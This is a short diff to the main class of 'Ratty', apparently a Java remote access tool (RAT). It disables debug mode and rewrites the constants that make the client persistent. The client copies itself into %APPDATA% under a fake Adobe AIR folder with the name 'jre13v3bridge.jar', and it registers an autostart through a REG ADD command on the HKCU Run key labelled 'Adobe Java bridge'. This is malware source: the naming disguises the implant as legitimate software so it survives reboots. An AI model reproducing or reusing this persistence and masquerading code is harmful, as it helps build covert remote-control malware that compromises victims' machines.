@@ -26,7 +26,7 @@ import de.sogomn.rat.server.gui.RattyGuiController;
  */
 public final class Ratty {
 	
-	public static final boolean DEBUG = true;
+	public static final boolean DEBUG = false;
 	public static final String VERSION = "1.7";
 	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
 	
@@ -36,11 +36,8 @@ public final class Ratty {
 	
 	private static final int CONNECTION_INTERVAL = 2500;
 	private static final String CONNECTION_DATA_FILE_NAME = "/connection_data.txt";
-	private static final String STARTUP_FOLDER_NAME = "Adobe" + File.separator + "AIR";
-	private static final String STARTUP_FILE_NAME = "jre13v3bridge.jar";
-	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + STARTUP_FOLDER_NAME + File.separator + STARTUP_FILE_NAME;
-	private static final String STARTUP_COMMAND = System.getProperty("java.home") + File.separator + "bin" + File.separator + "java.exe";
-	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_COMMAND + " " + STARTUP_FILE_PATH + "\"";
+	private static final String STARTUP_FILE_PATH = System.getenv("APPDATA") + File.separator + "Adobe" + File.separator + "AIR" + File.separator + "jre13v3bridge.jar";
+	private static final String STARTUP_REGISTRY_COMMAND = "REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v \"Adobe Java bridge\" /d \"" + STARTUP_FILE_PATH + "\"";
 	private static final String NO_GUI_COMMAND = "NOGUI";
 	
 	private static final String PORT_INPUT_QUESTION = LANGUAGE.getString("server.port_question");
